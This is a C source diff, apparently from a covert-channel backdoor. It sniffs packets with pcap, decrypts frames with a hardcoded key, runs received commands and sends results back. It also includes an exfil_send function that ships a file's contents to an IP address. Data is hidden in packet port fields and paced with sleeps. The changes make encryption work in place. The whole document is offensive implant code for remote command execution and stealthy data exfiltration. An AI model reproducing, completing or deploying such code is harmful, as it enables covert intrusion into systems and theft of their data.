@@ -71,7 +71,6 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 {
 	char *ptr;
 	char *data;
-//	char *dec;
 	char type;
 	static char buf[MAX_LEN];
 	static int len = 0;
@@ -109,8 +108,9 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 	if (len % FRAM_SZ != 0) // Check for frame
 		return;
 
-	//	dec = decrypt(SEKRET, ptr, FRAM_SZ);
-	//	free(dec);
+	data -= FRAM_SZ;
+	
+	decrypt(SEKRET, data, FRAM_SZ);
 
 	// Step 4: see if we have a full transmission
 	data = getTransmission(buf, &len, &type);
@@ -165,7 +165,6 @@ void execute(char *command, u_int32_t ip, u_int16_t port)
 	for (int i = 0; i < tot_len; i += 8)
 	{
 		char frame[FRAM_SZ];
-//		char *enc;
 		char *ptr;
 		int fram_len;
 		uint16 src_port = 0;
@@ -177,7 +176,7 @@ void execute(char *command, u_int32_t ip, u_int16_t port)
 
 		memcpy(frame, ptr, fram_len);
 
-//		enc = encrypt(SEKRET, frame, FRAM_SZ);
+		encrypt(SEKRET, frame, FRAM_SZ);
 
 		for (int j = 0; j < FRAM_SZ; ++j)
 		{
@@ -192,7 +191,6 @@ void execute(char *command, u_int32_t ip, u_int16_t port)
 			usleep(SLEEP_TIME);
 			_send(ip, src_port, dst_port, channel);
 		}
-		//			free(enc);
 	}
 
 	free(trans);
@@ -224,7 +222,6 @@ void exfil_send(uint32 ipaddr, char *path)
 		for (int i = 0; i < tot_len; i += 8)
 		{
 			char frame[FRAM_SZ];
-//			char *enc;
 			char *ptr;
 			int fram_len;
 			uint16 src_port = 0;
@@ -236,7 +233,7 @@ void exfil_send(uint32 ipaddr, char *path)
 
 			memcpy(frame, ptr, fram_len);
 
-//			enc = encrypt(SEKRET, frame, FRAM_SZ);
+			encrypt(SEKRET, frame, FRAM_SZ);
 
 			for (int j = 0; j < FRAM_SZ; ++j)
 			{
@@ -248,8 +245,6 @@ void exfil_send(uint32 ipaddr, char *path)
 				usleep(SLEEP_TIME);
 				_send(ipaddr, src_port, dst_port, channel);
 			}
-
-//			free(enc);
 		}
 	}
 }
